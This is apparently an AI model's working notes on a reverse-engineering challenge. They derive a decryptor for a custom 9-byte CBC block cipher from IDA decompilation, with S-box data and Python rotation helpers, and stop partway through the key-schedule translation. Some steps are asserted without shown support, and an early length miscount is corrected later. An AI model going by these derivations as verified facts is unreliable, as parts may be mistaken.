    v10 = (unsigned int)((int)v9 % 9) >> 31;
  v11 = 0;
  v12 = (int)(9 - 9 * v10 - (int)v9 % 9) % 9;
  if ( v12 )
    v11 = v12 >> 31;
  v13 = v12 + 8 * v11 + v11;
```



如果v9%9==0, then v10=0, v12 = (9 - 0 - 0) % 9 = 9%9=0, so v13=0? 所以没有填充。

但密文是48字节，所以可能加密后输出是48字节？但输入45字节，没有填充，加密后怎么是48字节？加密函数输出是填充后的长度，如果没有填充，输出应该是45字节。但45字节的密文，16进制字符串应该是90字符，但这里只有96字符，所以是48字节。所以矛盾。

或许我误读了主程序。在主程序中，加密的是`msg = input_buffer.encode()`，输入缓冲区是45字节，所以msg是45字节。然后加密后得到`cipher`，然后转换为16进制`result_hex`。如果加密输出是45字节，那么result_hex长度是90，但target_hex长度是96，所以是48字节。所以加密输出是48字节。

这意味着加密函数对45字节输入输出48字节？所以可能有填充。但根据代码，填充长度是0，所以没有填充。那么为什么输出48字节？

再看加密函数：在`sub_180001510`中， after padding, the length is `v13 + v9`, which is 0+45=45. Then it calls `sub_1800052A0` with the buffer and length 45. But in `sub_1800052A0`, it processes the data in blocks of 9 bytes. But 45 is multiple of 9, so it processes 5 blocks.

Then what is the output of `sub_1800052A0`? It doesn't change the length, so output should be 45 bytes. But then how come the cipher is 48 bytes?

Perhaps I missed something. In `sub_180001510`, after calling `sub_1800052A0`, it creates a bytes object with `PyBytes_FromStringAndSize(v15, v13 + (int)v9)`, which is 45 bytes. So cipher is 45 bytes. Then in main program, `result_hex = cipher.hex()` would be 90 characters. But target_hex is 96 characters, so something is wrong.

Let's check the main program code provided at the end. It says:

python

```
                        import luo_shu
                        msg = input_buffer.encode()
                        key = b'LESCBCKEY'
                        iv = b'LESCBC_iv'
                        cipher = luo_shu.encrypt(msg, 1, key, iv)
                        result_hex = cipher.hex()
```



And target_hex is '490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69' which is 96 characters, so 48 bytes.

So perhaps the encryption function does add padding? Let's rethink the padding calculation.

In `sub_180001510`:

c

```
  v9 = *(_QWORD *)(a2 + 16); // length of message
  // ...
  if ( (int)v9 % 9 )
    v10 = (unsigned int)((int)v9 % 9) >> 31;
  v11 = 0;
  v12 = (int)(9 - 9 * v10 - (int)v9 % 9) % 9;
  if ( v12 )
    v11 = v12 >> 31;
  v13 = v12 + 8 * v11 + v11;
```



This is confusing. Let me simulate for v9=45.
v9=45, v9%9=0, so v10=0.
v12 = (9 - 0 - 0) % 9 = 9 % 9 = 0.
v11 = 0 because v12=0.
v13 = 0 + 0 + 0 = 0.
So no padding.

But for v9=44, v9%9=8, v10=0? v10 = (8 >> 31) = 0 because 8 is positive.
v12 = (9 - 0 - 8) % 9 = 1 % 9 = 1.
v11 = 1 >> 31 = 0.
v13 = 1 + 0 + 0 = 1.
So padding 1 byte.

So for v9=45, no padding.

So why is the ciphertext for 45-byte message 48 bytes? Unless the encryption function always outputs a multiple of 9 bytes? But according to code, it outputs the same length as input after padding, which for 45 bytes is 45 bytes.

This is a puzzle. Perhaps the encryption function itself expands the data? But from the code, it doesn't seem to.

Another possibility: the target_hex includes the IV or something? But no, the IV is passed separately.

Let's look at the encryption function call in the main program: it uses mode=1, key, iv. Perhaps the encryption function returns the IV along with the ciphertext? But from the code, it doesn't.

Perhaps I misread the target_hex. Let me count the characters in target_hex:
'490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69'
Let's split into bytes: 49 0e 0a d0 37 4f 2c dd 12 6e 5b 18 4b f4 e6 da 66 9a 4c be a8 8f ac 91 64 94 ed d9 01 49 80 9a 7c 92 ee c2 e8 2e d3 fc a5 81 2d 9f 69
That's 24 bytes? No, each two characters is one byte, so from '49' to '69' how many? Let's list:
49,0e,0a,d0,37,4f,2c,dd,12,6e,5b,18,4b,f4,e6,da,66,9a,4c,be,a8,8f,ac,91,64,94,ed,d9,01,49,80,9a,7c,92,ee,c2,e8,2e,d3,fc,a5,81,2d,9f,69
I count 45 bytes? Let's see: from index0 to index44? 45 bytes. So target_hex is 90 characters? But the string given has 96 characters? Let me copy exactly from the code:

text

```
target_hex = '490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69'
```



Now, let's count the characters:
4-9-0-e-0-a-d-0-3-7-4-f-2-c-d-d-1-2-6-e-5-b-1-8-4-b-f-4-e-6-d-a-6-6-9-a-4-c-b-e-a-8-8-f-a-c-9-1-6-4-9-4-e-d-d-9-0-1-4-9-8-0-9-a-7-c-9-2-e-e-c-2-e-8-2-e-d-3-f-c-a-5-8-1-2-d-9-f-6-9

I count 90 characters? Let's use Python:

> > > s = '490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69'
> > > len(s)
> > > 90

So it is 90 characters, so 45 bytes. So no problem. My mistake.

So ciphertext is 45 bytes for 45 bytes input.

So for decryption, we have ciphertext of 45 bytes, which is 5 blocks of 9 bytes.

Now, to decrypt, we need to reverse the encryption process.

Encryption steps for CBC mode with block size 9:

- Let P_i be plaintext blocks, C_i be ciphertext blocks, IV be the iv.
- C0 = encrypt(P0 XOR IV)
- C1 = encrypt(P1 XOR C0)
- ...
- So for decryption:
- P0 = decrypt(C0) XOR IV
- P1 = decrypt(C1) XOR C0
- ...

So we need to implement the decrypt function for one block.

The block encryption function in `sub_1800052A0` is what we need to reverse.

Let's denote the block encryption function as E_block.

In `sub_1800052A0`, for each block, it does 45 rounds of transformation. Each round consists of:

1. XOR with constants: for each byte in the block, XOR with a constant from the magic square: [4,9,2,3,5,7,8,1,6] but in a specific order? From code, the XOR is done as:
   - byte0: XOR 4
   - byte1: XOR 9
   - byte2: XOR 2
   - byte3: XOR 3
   - byte4: XOR 5
   - byte5: XOR 7
   - byte6: XOR 8
   - byte7: XOR 1
   - byte8: XOR 6
     So constants: [4,9,2,3,5,7,8,1,6]
2. Then, depending on round number (even or odd), apply a rotation function `sub_180004E20` or `sub_180004F80` with a key-derived value? But in the code, the first rotation uses `v31` which is from the state structure. The state structure is initialized from key and iv in `sub_1800050E0`.
3. Then XOR with some values from the state structure.
4. Then again depending on round number, apply rotation function with fixed constants from `byte_180008488` (the magic square array).
5. Then apply S-box `byte_1800084A0`.

So to reverse, we need to do the inverse operations in reverse order.

The S-box is a substitution, so we need the inverse S-box.
The rotation functions `sub_180004E20` and `sub_180004F80` are bit rotations, so their inverses are opposite rotations.
The XOR with constants and state values are reversible.

But the state values are derived from key and iv, and are the same for encryption and decryption? In decryption, we need the same state values.

So for decryption, we need to know the key and iv. From main program, key is b'LESCBCKEY' and iv is b'LESCBC_iv'. Note that key is 9 bytes? 'LESCBCKEY' is 9 bytes. iv is 'LESCBC_iv' which is 9 bytes? 'LESCBC_iv' has 9 characters? L,E,S,C,B,C,_,i,v -> 9 bytes. So yes.

So in decryption, we can use the same key and iv to initialize the state.

Now, how to reverse the block encryption?

Let me define the round function. Let B be the current state of the block (9 bytes). Each round R from 0 to 44 does:

1. B = B XOR constants? But from code, the XOR with constants is done only once at the beginning of the round? Actually, from code:

   c

   ```
   v20 = *(v18 - 3);
   v21 = v17;
   v44.m128i_i64[0] = *(_QWORD *)(v18 - 11);
   // ... then load bytes into v30, v29, ... v20
   do
   {
     v44.m128i_i8[0] = v30 ^ 4;
     v44.m128i_i8[6] = v24 ^ 8;
     v44.m128i_i8[7] = v23 ^ 1;
     v44.m128i_i8[1] = v29 ^ 9;
     v44.m128i_i8[2] = v28 ^ 2;
     v44.m128i_i8[3] = v27 ^ 3;
     v44.m128i_i8[4] = v26 ^ 5;
     v44.m128i_i8[5] = v25 ^ 7;
     v44.m128i_i8[8] = v20 ^ 6;
   ```

   

   So at the start of each round, the block is XORed with constants. So this is the first step.

2. Then, if round is odd, call `sub_180004E20(&v44, v31)`; else call `sub_180004E20`? wait, code:

   c

   ```
   if ( (v22 & 1) != 0 )
     sub_180004E20(&v44, v31);
   else
     sub_180004F80(&v44, v31);
   ```

   

   So for even rounds (v22 even), call `sub_180004F80`, for odd rounds, call `sub_180004E20`. But wait, `v22` starts from 0 to 44, so even rounds use `sub_180004F80` and odd rounds use `sub_180004E20`? But from code, when v22=0 (even), it calls `sub_180004F80`? Let's see: if (v22 & 1) != 0 then call `sub_180004E20`, else call `sub_180004F80`. So for even v22, call `sub_180004F80`, for odd v22, call `sub_180004E20`.

3. Then XOR with state values:

   c

   ```
   v32 = *v21 ^ v44.m128i_i8[1];
   v33 = v21[1] ^ v44.m128i_i8[2];
   v34 = v21[5] ^ v44.m128i_i8[0];
   v35 = v21[6] ^ v44.m128i_i8[5];
   v44.m128i_i8[0] = *(v21 - 2) ^ v44.m128i_i8[3];
   v44.m128i_i8[1] = *(v21 - 1) ^ v44.m128i_i8[8];
   v44.m128i_i8[4] ^= v21[2];
   v44.m128i_i8[5] = v21[3] ^ v44.m128i_i8[6];
   v36 = v21[4] ^ v44.m128i_i8[7];
   v44.m128i_i8[2] = v32;
   v44.m128i_i8[3] = v33;
   v44.m128i_i8[6] = v36;
   v44.m128i_i8[7] = v34;
   v44.m128i_i8[8] = v35;
   ```

   

   So this is a linear transformation? Let me denote the state of v44 as S[0] to S[8]. After this step, new state T is:
   T[0] = state_value1 ^ S[3]
   T[1] = state_value2 ^ S[8]
   T[2] = state_value3 ^ S[1] [ because v32 = *v21 ^ S[1] then assigned to T[2] ]
   T[3] = state_value4 ^ S[2] [ v33 = v21[1] ^ S[2] then T[3] ]
   T[4] = S[4] ^ state_value5
   T[5] = state_value6 ^ S[6] [ v35 = v21[6] ^ S[5] then assigned to T[8]? wait no ]

   Let's map carefully:

   Let S = [s0, s1, s2, s3, s4, s5, s6, s7, s8] before XOR.

   After XOR with state values:

   s0 becomes: *(v21-2) ^ s3
   s1 becomes: *(v21-1) ^ s8
   s2 becomes: *v21 ^ s1
   s3 becomes: v21[1] ^ s2
   s4 becomes: s4 ^ v21[2]
   s5 becomes: v21[3] ^ s6
   s6 becomes: v21[4] ^ s7
   s7 becomes: v21[5] ^ s0
   s8 becomes: v21[6] ^ s5

   So it's a permutation and XOR with state values.

4. Then, again based on round parity, call rotation function with fixed constants:

   c

   ```
   if ( (v22 & 1) != 0 )
     sub_180004F80(&v44, byte_180008488);
   else
     sub_180004E20(&v44, byte_180008488);
   ```

   

   So for even rounds, call `sub_180004E20` with magic square constants? wait, for even v22, call `sub_180004F80`? No, from code: if (v22 & 1) != 0 then call `sub_180004F80` with magic square, else call `sub_180004E20` with magic square.

   So for even rounds (v22 even), call `sub_180004E20` with magic square?
   Let's clarify:

   - First rotation: based on v22 even/odd, call `sub_180004F80` for even, `sub_180004E20` for odd? But from code, it's the opposite.
     Actually from code:

   c

   ```
   if ( (v22 & 1) != 0 )
     sub_180004E20(&v44, v31);
   else
     sub_180004F80(&v44, v31);
   ```

   

   So for v22 even (0,2,4,...), call `sub_180004F80` with v31.
   For v22 odd, call `sub_180004E20` with v31.

   Then after XOR with state,:

   c

   ```
   if ( (v22 & 1) != 0 )
     sub_180004F80(&v44, byte_180008488);
   else
     sub_180004E20(&v44, byte_180008488);
   ```

   

   So for v22 even, call `sub_180004E20` with magic square?
   For v22 odd, call `sub_180004F80` with magic square.

5. Then apply S-box to each byte.

So the round function is complex.

To decrypt, we need to invert each round in reverse order.

Let me denote the round function as F(B, round) where B is the block, and round from 0 to 44.

Then encryption: B_{i+1} = F(B_i, i) for i=0 to 44, where B_0 is the input block.

So for decryption: B_i = F^{-1}(B_{i+1}, i) for i=44 down to 0.

So we need the inverse of F.

The inverse of F would be:

- Start with B after encryption.
- Inverse of S-box: apply inverse S-box.
- Inverse of the second rotation: which is the inverse of `sub_180004E20` or `sub_180004F80`? Since `sub_180004E20` does left rotation, its inverse is right rotation, which is `sub_180004F80`? Let's see the functions.

`sub_180004E20` does:

c

```
  *a1 = __ROL1__(*a1, *a2 & 7);
  // ...
```



So it left-rotates each byte by a number of bits specified by a2[i] & 7.

`sub_180004F80` does:

c

```
  *a1 = (v2 >> v8) | v7; // which is right-rotate
```



So `sub_180004F80` is right-rotate.

So `sub_180004E20` is left-rotate, and `sub_180004F80` is right-rotate.

The inverse of left-rotate by n is right-rotate by n, and vice versa.

So the inverse of `sub_180004E20` is `sub_180004F80`, and the inverse of `sub_180004F80` is `sub_180004E20`.

Now, in the round function, the second rotation uses the magic square array as the rotation amounts. So for decryption, when we reverse the round, we need to apply the inverse rotation at the same step.

Similarly for the first rotation, it uses v31 from the state, so we need to know the state values.

The state values are generated from key and iv in `sub_1800050E0`. So for decryption, we can generate the same state by calling `sub_1800050E0` with the same key and iv.

So plan for decryption of one block:

Let C be the ciphertext block.
We want to find P such that E_block(P) = C.

But since E_block is 45 rounds, we have:
C = F_44(F_43(... F_0(P)...))

So P = F^{-1}_0(F^{-1}*1(... F^{-1}*{44}(C)...))

So we need to apply the inverse rounds from round 44 down to 0.

For each round i in reverse order (from 44 to 0), we do:

1. Apply inverse S-box? But in the round, the S-box is applied at the end. So when reversing, we start with the ciphertext block, which has already been through the S-box in the last round? So for the inverse round, the first step is to apply the inverse S-box.

But let's list the steps in a round in encryption:

- Start with B
- XOR with constants
- First rotation: based on i even/odd, use left or right rotate with state value
- XOR with state values
- Second rotation: based on i even/odd, use left or right rotate with magic square constants
- S-box

So for decryption, we need to reverse these steps in reverse order:

- Start with C

- Inverse S-box: apply inverse S-box to C.

- Inverse of second rotation: which is, for round i, the second rotation was: if i even, then `sub_180004E20` with magic square, so inverse is `sub_180004F80` with magic square? But wait, from code, for even i, second rotation is `sub_180004E20`? Let's recall from code for second rotation:

  c

  ```
  if ( (v22 & 1) != 0 )
    sub_180004F80(&v44, byte_180008488);
  else
    sub_180004E20(&v44, byte_180008488);
  ```

  

  So for i even (v22 even), second rotation is `sub_180004E20` with magic square.
  For i odd, second rotation is `sub_180004F80` with magic square.

  So inverse: for i even, inverse of `sub_180004E20` is `sub_180004F80` with the same magic square.
  For i odd, inverse of `sub_180004F80` is `sub_180004E20` with the same magic square.

- Then inverse of the XOR with state values. This is a linear transformation, so we need to compute the inverse of that transformation. Let me denote the transformation as T(S) where S is the block, and it does:
  Let S = [s0, s1, s2, s3, s4, s5, s6, s7, s8]
  After transformation, we have:
  t0 = A0 ^ s3
  t1 = A1 ^ s8
  t2 = A2 ^ s1
  t3 = A3 ^ s2
  t4 = A4 ^ s4
  t5 = A5 ^ s6
  t6 = A6 ^ s7
  t7 = A7 ^ s0
  t8 = A8 ^ s5

  where A0 = *(v21-2), A1 = *(v21-1), A2 = *v21, A3 = v21[1], A4 = v21[2], A5 = v21[3], A6 = v21[4], A7 = v21[5], A8 = v21[6]

  So to invert, we have:
  s0 = t7 ^ A7
  s1 = t2 ^ A2
  s2 = t3 ^ A3
  s3 = t0 ^ A0
  s4 = t4 ^ A4
  s5 = t8 ^ A8
  s6 = t5 ^ A5
  s7 = t6 ^ A6
  s8 = t1 ^ A1

  So yes, it is invertible.

- Then inverse of the first rotation. The first rotation was: for i even, `sub_180004F80` with state value v31? wait, from code for first rotation:

  c

  ```
  if ( (v22 & 1) != 0 )
    sub_180004E20(&v44, v31);
  else
    sub_180004F80(&v44, v31);
  ```

  

  So for i even, first rotation is `sub_180004F80` with v31.
  For i odd, first rotation is `sub_180004E20` with v31.

  So inverse: for i even, inverse of `sub_180004F80` is `sub_180004E20` with v31.
  For i odd, inverse of `sub_180004E20` is `sub_180004F80` with v31.

- Then inverse of XOR with constants. XOR with constants is straightforward: XOR with the same constants again, since XOR is self-inverse.

So for decryption of one block, we do for round i from 44 down to 0:

1. Inverse S-box: apply inverse S-box to each byte.
2. Inverse second rotation:
   - if i is even, apply `sub_180004F80` with magic square constants.
   - if i is odd, apply `sub_180004E20` with magic square constants.
3. Inverse XOR with state values: use the inverse transformation as above, with the state values for round i.
4. Inverse first rotation:
   - if i is even, apply `sub_180004E20` with state value v31 for round i.
   - if i is odd, apply `sub_180004F80` with state value v31 for round i.
5. XOR with constants: XOR with [4,9,2,3,5,7,8,1,6].

But note: in encryption, the XOR with constants is the first step in the round. So in decryption, it should be the last step in the inverse round.

So order in decryption for one round i:

- Start with B
- Step 1: Inverse S-box
- Step 2: Inverse second rotation
- Step 3: Inverse XOR with state values
- Step 4: Inverse first rotation
- Step 5: XOR with constants

Then after all rounds, we get the plaintext block.

Now, we need the state values for each round. The state values are generated in `sub_1800050E0`. So we need to understand how the state is structured.

In `sub_1800050E0`, it initializes a state array of 432 bytes? The function takes a1, which is a pointer to a buffer, and a2 (key), a3 (iv), a4 (mode).

The state buffer is 432 bytes? From code:

c

```
  _BYTE v39[432]; // [rsp+40h] [rbp-218h] BYREF
```



And then it calls `sub_1800050E0(v39, &v42, &Src, a3);`
So v39 is the state.

In `sub_1800050E0`, it does:

c

```
  *(_QWORD *)a1 = 0LL;
  *(_BYTE *)(a1 + 8) = 0;
  *(_QWORD *)(a1 + 9) = 0LL;
  *(_BYTE *)(a1 + 17) = 0;
  if ( a2 )
    memcpy((void *)a1, a2, *a2 != 0 ? 9 : 0);
  if ( a3 )
    memcpy((void *)(a1 + 9), a3, *a3 != 0 ? 9 : 0);
  v7 = *(_BYTE *)(a1 + 8);
  v8 = 9;
  *(_QWORD *)(a1 + 18) = *(_QWORD *)a1;
  *(_BYTE *)(a1 + 26) = v7;
  *(_DWORD *)(a1 + 424) = a4;
  v9 = (_BYTE *)(a1 + 27);
  do
  {
    *v9 = 45 * (*(v9 - 9) + byte_180008488[v8 % 9u]);
    v9[1] = 45 * (*(v9 - 8) + byte_180008488[v8 - 9 * ((v8 + 1) / 9u) + 1]);
    // ... up to v9[5]
    v8 += 6;
    v9 += 6;
  }
  while ( v8 < 405 );
```



So it initializes the first 18 bytes with key and iv? Then from offset 18 to 26, it copies from key? Then from offset 27 to 426, it computes values based on key and iv and the magic square.

So the state has a fixed structure, and it is used in the encryption rounds. In `sub_1800052A0`, when doing the XOR with state values, it uses `v21` which is set to `v43` which is `v17` which is from the state? Let's see:
In `sub_1800052A0`:

c

```
  v17 = (_BYTE *)(a1 + 20);
  // ...
  v43 = v17;
```



Then in the loop:

c

```
  v21 = v17;
```



So `v21` points to `a1+20`, which is within the state. Then when doing XOR, it uses `v21-2` which is `a1+18`, `v21-1` which is `a1+19`, then `v21` is `a1+20`, `v21[1]` is `a1+21`, up to `v21[6]` is `a1+26`.

So the state values used in the XOR are from offset 18 to 26? But then in the loop, `v21` is incremented? No, in the code, `v21` is not incremented in the inner round loop? Let's see:

c

```
  do
  {
    // ...
    v21 = v17;
    // ...
    do
    {
      // ...
      v21 += 9;
      // ...
    }
    while ( v22 < 45 );
    // ...
    v17 = v43;
  }
```



So in the inner round loop for each block, `v21` starts at `v17` and then increases by 9 each time? But `v17` is fixed for the block? Then for each round in the block, `v21` changes? Let's see: `v21` is set to `v17` at the start of the block processing, then inside the round loop, `v21` is incremented by 9 after each round? So for each round, we use different state values? The state values are from `v17` to `v17+9*44`? because there are 45 rounds.

So the state has precomputed values for each round? In `sub_1800050E0`, it computes values from offset 27 to 426, which is 400 bytes? 45 rounds * 9 bytes per round? 45*9=405, so yes.

So for round i, the state values for the XOR are from offset `18 + 9*i` to `18 + 9*i + 8`? But from code, `v21` is set to `v17` which is `a1+20`, so then for round i, `v21` = `v17 + 9*i` = `a1+20 + 9*i`. Then the values used are:

- `v21-2` = a1+18+9*i
- `v21-1` = a1+19+9*i
- `v21` = a1+20+9*i
- `v21[1]` = a1+21+9*i
- ...
- `v21[6]` = a1+26+9*i

So the values are from a1+18+9*i to a1+26+9*i, which is 9 bytes.

Similarly, for the first rotation, it uses `v31` which is from the state? In the code for first rotation, it uses `v31` which is set from `v21`? No, in the code, `v31` is not directly shown. Let's look:

c

```
   if ( (v22 & 1) != 0 )
     sub_180004E20(&v44, v31);
   else
     sub_180004F80(&v44, v31);
```



What is `v31`? In the code, before the inner loop, we have:

c

```
   v21 = v17;
```



But then inside the loop, we have:

c

```
   v31 = v21 - 2;
```



So `v31` is `v21 - 2` = `a1+18+9*i` for round i.

So for the first rotation, the rotation amounts are taken from the state values at `a1+18+9*i` to `a1+26+9*i`? But wait, `v31` is a pointer to 9 bytes? So the rotation function uses these 9 bytes as the rotation amounts for each byte in the block.

So in summary, for each round i, we have two sets of state values:

- For first rotation: amounts from state[18+9*i] to state[26+9*i]
- For XOR transformation: values from state[18+9*i] to state[26+9*i] (the same bytes)

So in decryption, for each round i, we need these state values.

So steps for decryption of one block:

1. Generate the state using `sub_1800050E0` with key and iv.
2. Let B be the ciphertext block.
3. For i from 44 down to 0:
   a. Apply inverse S-box to B.
   b. Apply inverse second rotation:
   if i is even, use `sub_180004F80` with magic square constants.
   if i is odd, use `sub_180004E20` with magic square constants.
   c. Let A = state[18+9*i] to state[26+9*i] (9 bytes).
   Then apply inverse XOR transformation:
   Let B = [b0, b1, b2, b3, b4, b5, b6, b7, b8]
   Then compute:
   s0 = b7 ^ A[7] [ where A[7] is state[18+9*i+7] = state[25+9*i] ]
   s1 = b2 ^ A[2] [ A[2] is state[20+9*i] ]
   s2 = b3 ^ A[3] [ state[21+9*i] ]
   s3 = b0 ^ A[0] [ state[18+9*i] ]
   s4 = b4 ^ A[4] [ state[22+9*i] ]
   s5 = b8 ^ A[8] [ state[26+9*i] ]
   s6 = b5 ^ A[5] [ state[23+9*i] ]
   s7 = b6 ^ A[6] [ state[24+9*i] ]
   s8 = b1 ^ A[1] [ state[19+9*i] ]
   Then set B = [s0, s1, s2, s3, s4, s5, s6, s7, s8]
   d. Apply inverse first rotation:
   if i is even, use `sub_180004E20` with A? because amounts are from A? But note: in encryption, for first rotation, we used `v31` which is pointer to A? So yes, the rotation amounts are from A.
   So for i even, encryption first rotation was `sub_180004F80` with A, so inverse is `sub_180004E20` with A.
   For i odd, encryption first rotation was `sub_180004E20` with A, so inverse is `sub_180004F80` with A.
   e. XOR with constants: B = B XOR [4,9,2,3,5,7,8,1,6]
4. Then B is the plaintext block.

Now, we need to implement this in Python.

First, we need the S-box and its inverse.
The S-box is given as `byte_1800084A0` in the IDA output. Let's extract it.

From IDA:

c

```
.rdata:00000001800084A0 byte_1800084A0  db 38h, 0D6h, 18h, 0Eh, 0C6h, 0A4h, 47h, 4Ah, 97h, 0A1h
.rdata:00000001800084AA                 db 0A2h, 79h, 0E3h, 0F9h, 61h, 0Bh, 0C3h, 0FAh, 8, 32h
.rdata:00000001800084B4                 db 5Fh, 73h, 4Fh, 6Ch, 0BEh, 68h, 7Bh, 0B3h, 4Ch, 1Bh
.rdata:00000001800084BE                 db 8Dh, 3Ch, 63h, 0F5h, 0E8h, 0D8h, 0CBh, 0CFh, 0BCh, 0C1h
.rdata:00000001800084C8                 db 9Ah, 3Fh, 6Fh, 9Fh, 70h, 0CAh, 60h, 49h, 30h, 0E6h
.rdata:00000001800084D2                 db 86h, 90h, 0C8h, 1Fh, 0E5h, 6Eh, 8Eh, 0, 2Eh, 36h, 0EAh
.rdata:00000001800084DD                 db 91h, 5Dh, 92h, 2Dh, 6Bh, 0EFh, 0C9h, 0DFh, 0ACh, 0F7h
.rdata:00000001800084E7                 db 20h, 9Bh, 99h, 58h, 0B8h, 74h, 16h, 42h, 0F3h, 0B5h
.rdata:00000001800084F1                 db 89h, 2Ch, 0DAh, 12h, 87h, 0E1h, 0ADh, 0FFh, 19h, 9Eh
.rdata:00000001800084FB                 db 80h, 27h, 0B6h, 8Fh, 53h, 65h, 0DEh, 24h, 2Ah, 78h
.rdata:0000000180008505                 db 82h, 95h, 9, 34h, 48h, 0D2h, 33h, 0E2h, 3Dh, 55h, 0BBh
.rdata:0000000180008510                 db 0Dh, 6Ah, 8Ah, 6Dh, 0ABh, 2, 59h, 1, 2Bh, 56h, 0DCh
.rdata:000000018000851B                 db 14h, 72h, 0B0h, 15h, 37h, 0CEh, 8Bh, 0B4h, 39h, 0AFh
.rdata:0000000180008525                 db 83h, 10h, 88h, 26h, 0F2h, 40h, 84h, 98h, 0C2h, 5Bh
.rdata:000000018000852F                 db 0DBh, 46h, 51h, 7Eh, 0A0h, 0A3h, 0D4h, 85h, 43h, 0DDh
.rdata:0000000180008539                 db 0E0h, 3Ah, 17h, 0D9h, 0AAh, 23h, 4Dh, 0FEh, 21h, 44h
.rdata:0000000180008543                 db 0C5h, 1Ah, 31h, 9Dh, 2Fh, 0A5h, 0A7h, 71h, 54h, 5Ch
.rdata:000000018000854D                 db 5Eh, 0C4h, 41h, 0B7h, 0B1h, 0F0h, 0C0h, 5, 1Ch, 66h
.rdata:0000000180008557                 db 7Fh, 29h, 77h, 0CCh, 57h, 0FDh, 4Eh, 13h, 28h, 5Ah
.rdata:0000000180008561                 db 0F4h, 0D1h, 50h, 96h, 0D7h, 52h, 0D3h, 0BDh, 0EEh, 9Ch
.rdata:000000018000856B                 db 7Ah, 0F8h, 0EBh, 93h, 3Bh, 0D0h, 69h, 81h, 3, 22h, 45h
.rdata:0000000180008576                 db 0E4h, 0Ah, 7Ch, 0A9h, 0F6h, 62h, 0A8h, 3Eh, 0BFh, 7Dh
.rdata:0000000180008580                 db 67h, 0ECh, 0Ch, 1Dh, 0E7h, 4Bh, 0CDh, 0EDh, 94h, 0A6h
.rdata:000000018000858A                 db 8Ch, 4, 75h, 0FCh, 1Eh, 0FBh, 0B2h, 7, 0Fh, 0D5h, 0B9h
.rdata:0000000180008595                 db 76h, 11h, 25h, 35h, 0BAh, 0F1h, 0C7h, 64h, 0AEh, 6
.rdata:000000018000859F                 db 0E9h
```



So let's create the S-box array in Python. Note that these are hexadecimal values.

Similarly, the magic square constants for XOR are [4,9,2,3,5,7,8,1,6].

Now, we need to implement the rotation functions in Python.

`sub_180004E20` is left_rotate each byte by the amount from the given array.
`sub_180004F80` is right_rotate each byte by the amount from the given array.

We can implement these as:

python

```
def left_rotate_byte(b, n):
    n = n & 7
    return ((b << n) | (b >> (8 - n))) & 0xFF

def right_rotate_byte(b, n):
    n = n & 7
    return ((b >> n) | (b << (8 - n))) & 0xFF

def sub_180004E20(block, amounts):
    # block is list of 9 bytes, amounts is list of 9 bytes
    new_block = [0] * 9
    for i in range(9):
        new_block[i] = left_rotate_byte(block[i], amounts[i] & 7)
    return new_block

def sub_180004F80(block, amounts):
    new_block = [0] * 9
    for i in range(9):
        new_block[i] = right_rotate_byte(block[i], amounts[i] & 7)
    return new_block
```



But note: in the C code, the functions modify the block in-place. So in Python, we can similarly return a new block.

Now, we need to generate the state. How to generate the state? We have `sub_1800050E0` which takes key and iv.

Let me translate `sub_1800050E0` to Python.

The function does:

- Initialize the first 18 bytes with key and iv? Actually, it copies key to the first 9 bytes, and iv to the next 9 bytes.

- Then it sets bytes at offset 18 to 26 to be the same as the first 9 bytes? From code:

  c

  ```
  *(_QWORD *)(a1 + 18) = *(_QWORD *)a1;
  *(_BYTE *)(a1 + 26) = *(_BYTE *)(a1 + 8);
  ```

  

  So it copies the first 9 bytes to offset 18 to 26? But QWORD is 8 bytes, so it copies 8 bytes from a1 to a1+18, then copies the 9th byte from a1+8 to a1+26.

- Then it computes from offset 27 to 426 using a loop.

The loop from v8=9 to 404, step 6? Let's see the code:

c

```
  v8 = 9;
  v9 = (_BYTE *)(a1 + 27);
  do
  {
    *v9 = 45 * (*(v9 - 9) + byte_180008488[v8 % 9u]);
    v9[1] = 45 * (*(v9 - 8) + byte_180008488[v8 - 9 * ((v8 + 1) / 9u) + 1]);
    v9[2] = 45 * (*(v9 - 7) + byte_180008488[v8 - 9 * ((v8 + 2) / 9u) + 2]);
    v9[3] = 45 * (*(v9 - 6) + byte_180008488[v8 - 9 * ((v8 + 3) / 9u) + 3]);
    v9[4] = 45 * (*(v9 - 5) + byte_180008488[v8 - 9 * ((v8 + 4) / 9u) + 4]);
    result = (unsigned __int8)(*(v9 - 4) + byte_180008488[v8 - 9 * ((v8 + 5) / 9u) + 5]);
    v8 += 6;
    v9[5] = 45 * result;
    v9 += 6;
  }
  while ( v8 < 405 );
```



So it computes 6 bytes at a time, for v8 from 9 to 404, so total (405-9)/6 *6 = 396? But 405-9=396, so 396/6=66 iterations, so 66*6=396 bytes? But we need up to offset 426, and offset 27+396=423, so还不够? Let's see: offset 27 to 426 is 400 bytes? 426-27+1=400? So perhaps v8 goes to 405? But 405-9=396, then 396/6=66, so 66*6=396, then from offset 27 to 27+395=422, but we need up to 426, so missing 4 bytes? This doesn't match.

Perhaps I misread the loop condition. v8 starts at 9, and increments by 6 until v8 < 405, so v8 takes values 9,15,21,...,399? Then v9 starts at a1+27 and increments by 6 each time. So how many iterations? (399-9)/6 +1 = (390/6)+1=65+1=66 iterations? So 66*6=396 bytes written from a1+27 to a1+27+395= a1+422. But we need a1+426? So perhaps the state size is 432 bytes, but only 423 bytes are used? Or perhaps I have off-by-one.

From the code in `sub_1800052A0`, we use state from offset 18 to 26+9*44 = 18+396=414? So we need up to offset 414? 26+9*44=26+396=422? So offset 422? So our state needs to have values up to offset 422. In `sub_1800050E0`, we compute up to offset 422? Let's see: from offset 27 to 422? 422-27+1=396 bytes, which matches the 396 bytes we computed.

So yes, we have enough.

Now, how to compute the state values? The formula is:

For each index j from 0 to 395? But we have v8 from 9 to 404, and we compute based on v8.

Let me define an array `state` of 432 bytes.

First, set state[0:9] = key[0:9]? But key might be less than 9? But from main program, key is 9 bytes, so we can copy.
Similarly, state[9:18] = iv[0:9]

Then state[18:27] = state[0:9]? Because it copies 8 bytes from state[0] to state[18], and then state[26] = state[8].

So state[18] to state[25] = state[0] to state[7], and state[26] = state[8].

Then for the rest, we have a loop with v8 from 9 to 404, and we compute state[27] onwards.

Let k = v8, and let base = 27.
